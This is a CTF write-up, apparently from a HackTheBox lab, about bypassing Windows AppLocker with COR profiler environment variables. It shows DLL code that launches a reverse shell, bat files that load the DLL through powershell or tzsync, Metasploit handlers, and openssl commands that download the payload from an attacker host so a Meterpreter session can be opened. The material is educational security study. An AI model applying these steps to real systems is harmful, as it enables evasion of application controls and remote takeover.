---
title: Applocker Bypass: COR Profiler
url: https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html
date: 2019-03-15T09:46:00+00:00
tags: ctf, hackthebox, htb-ethereal, windows, applocker, meterpreter, metasploit, beryllium, visual-studio, dotnet, cor-profiler
---

![](https://0xdfimages.gitlab.io/img/ethereal-cor-cover.png)On of the challenges in Ethereal was having to use a shell comprised of two OpenSSL connections over different ports. And each time I wanted to exploit some user action, I had to set my trap in place, kill my shell, start two listeners, and wait. Things would have been a lot better if I could have just gotten a shell to connect back to me over one of the two open ports, but AppLocker made that nearly impossible. IppSec demoed a method to bypass those filters using COR Profiling. I wanted to play with it myself, and get some notes down (in the form of this post).

## Overview

This post is the result playing around with what I learned watching [IppSec’s post-Ethereal video](https://www.youtube.com/watch?v=T91iXd_VPVI) and reading through the [original source from Hack Players](https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html). This Applocker bypass is solid, and if it worked on Fighter (basis for the original Hack Player’s post) and Etherearl, it will likely prove valuable again. I’ll also give an overview on .NET Framework. I’m adding this to the Ethereal series of posts because I will show how to use COR Profiling to get a Meterpreter shell on Ethereal at the end of the post.

## Background

### .NET Framework

If you’re not a Windows developer or senior security expert, it’s likely that you’ve heard of the .NET framework, but don’t have a great feel for what exactly that means.

When you write a program in C or C++, and compile it, it interacts with the hardware through system calls. You’ll use libraries to abstract that from you (such as `#include <sdtio.h>` to get access to the `printf` function), but the resulting program interacts with the hardware.

The .NET Framework provides a virtual environment designed to allow language interoperability. Different .NET languages are compiled to code that runs on the Common Language Interpreter (CLI), in what’s known as the Common Language Runtime (CLR). This runtime provides services such as security and garbage collection, and gives a common interface down to the hardware. There’s a ton of languages that are [built to operate with .NET](https://en.wikipedia.org/wiki/List_of_CLI_languages), including:
- C#
- C++/CLI
- IronPython
- VB.NET
- PowerShell

Anything running inside the .NET CLI is known as managed code. In contract, languages that interact directly with the hardware are known as unmanaged code.

### Profiling

In the context of the .NET CLR, [Microsoft defines a profiler](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview) as:

> a tool that monitors the execution of another application.

It can be any DLL that consists of functions that receive and send messages to and from the program using the CLR API. There’s all sorts of detail I could dig into on how to set up a profiler, and what capabilities it might have. But that’s not really the point here. The point here is that a DLL is assigned to run when the managed code is loaded. I can take advantage of that.

### How To

Microsoft has a [detailed post](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/setting-up-a-profiling-environment) on how to enable profiling for legit purposes. For my purposes, I’ll need to set three environment variables.
- `COR_ENABLE_PROFILING=1` - This enables profiling. Since I’ll be setting it within a `cmd` window, it will apply to all programs started from that window.
- `COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}` - This tells Windows what profiler to run. However, it doesn’t actually matter for this case. What does matter is that it’s a valid [GUID](https://www.guidgenerator.com/online-guid-generator.aspx) string format.
- `COR_PROFILER_PATH=C:\users\0xdf\desktop\revshell.dll` - This is the DLL I want to run when starting a managed process.

## DLL

There are a couple options here.

### Beryllium

There’s a dll that the Hack Players offer called [Beryllium.dll](https://github.com/attl4s/pruebas/blob/master/Beryllium.dll). It’s a x64 meterpreter that takes LHOST and LPORT from the environment variables `IP` and `PORT` respectively.

### Build One

[IppSec walks through this in his video](https://youtu.be/T91iXd_VPVI?t=240). I like to do a couple things slightly differently. Either way works. In Visual Studio, Select File -> New Project. In the menu that comes up, expand “Visual C++” and click on “Windows Desktop”. The, select DLL from the options:

![1552438998178](https://0xdfimages.gitlab.io/img/1552438998178.png)

Give it a name, and hit “OK”.

Now find the [C++ reverse shell you want to use](https://raw.githubusercontent.com/tudorthe1ntruder/reverse-shell-poc/master/rs.c), and paste it into `revshell.cpp`. I’ll use the same one that IppSec used, and make the same edits, fixing `WSASocket` to `WSASocketW`, and changing `int main(int argc, char *argv[])` to `void revshell()`.

Next I’ll add the header file, call it `revshell.h`, and put in the function declaration:

```

#pragma once
void revshell();

```

The program already created `dllmain.cpp` for me. I’ll just add in an include for `revshell`, and a call under `DLL_PROCESS_ATTACH`:

```

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "revshell.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		revshell();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

I’ll build the project, and find the dll where it reports:

![1552439657920](https://0xdfimages.gitlab.io/img/1552439657920.png)

## Run It

### Custom Dll

Now I’ll run the bypass. All I need to do is set the environment variables, and then run an exe that’s managed. IppSec showed `tzsync`. `powershell` works too.

I’ll start a `nc` listener on my Kali box, and then run the following from a cmd terminal on my Windows VM:

```

C:\Users\0xdf\Desktop>set "COR_ENABLE_PROFILING=1"
C:\Users\0xdf\Desktop>set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}"
C:\Users\0xdf\Desktop>set "COR_PROFILER_PATH=C:\users\0xdf\desktop\revshell.dll"
C:\Users\0xdf\Desktop>powershell

```

`powershell` just hangs, but my listener connects:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.1.1.153.
Ncat: Connection from 10.1.1.153:54719.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\0xdf\Desktop>

```

### Beryllium

I can do the same thing with the `Beryllium.dll`. I’ll prep Metasploit on my Kali host:

```

root@kali# msfdb run
...[snip]...
msf5 > handler -H eth0 -P 136 -p windows/x64/meterpreter/reverse_tcp
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 10.1.1.41:136

```

Now, back in cmd, I’ll run the following bat file:

```

set "COR_ENABLE_PROFILING=1" 
set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}" 
set "COR_PROFILER_PATH=C:\users\0xdf\desktop\Beryllium.dll" 
set "PORT=136"
set "IP=10.1.1.41"
powershell 

```

When I run `cmd /c a.bat`, my terminal disappears. And I get a connection at Metasploit:

```

[*] Meterpreter session 1 opened (10.1.1.41:136 -> 10.1.1.153:54720) at 2019-03-12 21:20:54 -0400
msf5 > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: HACKSIES\0xdf

```

## Ethereal Meterpreter

### Overview

I’ll be using [my Ethereal shell](https://gitlab.com/0xdf/ctfscripts/tree/master/htb-ethereal) (check out the [post on writing it](/2019/03/09/htb-ethereal-shell.html)), so this is just after initial RCE and finding OpenSSL. Rather than get the shell by combining two OpenSSL connections, I’ll use OpenSSL to upload the dll and the bat script, and then run it.

The shell will run commands entered thought a for loop that sends results over `nslookup`. If I enter `quiet` before the command, it will run the command directory through the injection, with no output back.

### Upload Beryllium

I’ll use [Beryllium.dll](https://github.com/attl4s/pruebas/blob/master/Beryllium.dll) from HackPlayers. I’ll serve it with `ncat` as follows:

```

ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 73 < Beryllium.dll

```

Now I’ll tell Ethereal to get it:

```

ethereal> quiet c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 > c:\windows\servicing\packages\df.dll

```

I get the connection on `ncat`:

```

root@kali# ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 73 < Beryllium.dll
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::73
Ncat: Listening on 0.0.0.0:73
Ncat: Connection from 10.10.10.106.
Ncat: Connection from 10.10.10.106:49713.
root@kali# 

```

### Upload bat File

I’ve got this `bery.bat`, which will set the parameters used in this technique and then run `tzsync`, a managed program:

```

set "COR_ENABLE_PROFILING=1"
set "COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}"
set "COR_PROFILER_PATH=C:\windows\servicing\packages\df.dll"
set "IP=10.10.14.14"
set "PORT=136"
tzsync

```

Now I’ll upload that as well:

```

ethereal> quiet c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 > c:\users\public\desktop\shortcuts\bery.bat

```

```

root@kali# ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 73 < bery.bat
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::73
Ncat: Listening on 0.0.0.0:73
Ncat: Connection from 10.10.10.106.
Ncat: Connection from 10.10.10.106:49715.

```

### Execute

Just as in my test, I’ll start a handler for this incoming callback:

```

msf5 > handler -H tun0 -P 136 -p windows/x64/meterpreter/reverse_tcp
[*] Payload handler running as background job 4.

[*] Started reverse TCP handler on 10.10.14.14:136

```

I’ll run the following to kick off the execution:

```

ethereal> quiet cmd /c cmd < \users\public\desktop\shortcuts\bery.bat

```

And get a callback:

```

msf5 > [*] Sending stage (206403 bytes) to 10.10.10.106
[*] Meterpreter session 5 opened (10.10.14.14:136 -> 10.10.10.106:49716) at 2019-03-13 07:05:23 -0400
msf5 > sessions -i 5
[*] Starting interaction with 5...

meterpreter > getuid 
Server username: ETHEREAL\alan

```

I had to play a bit with how to get the bat file to kick off. It didn’t work when issued without the `quiet` command. I also needed the `cmd /c cmd <` to get it to run. Sometimes when your RCE is a weird injection, you have to try a few things to get something to run.

## Conclusion

COR Prefiltering is an interesting method to bypass Applocker and get arbitrary code execution on a locked down system. In Ethereal, I could use this new shell to skip the rest of the box and go to System with JuicyPotato. Or I could go the normal path and just have easy uploads and not have to worry about killing shells and relaunching listeners in time to catch user action.

[« Shell Development](/2019/03/09/htb-ethereal-shell.html)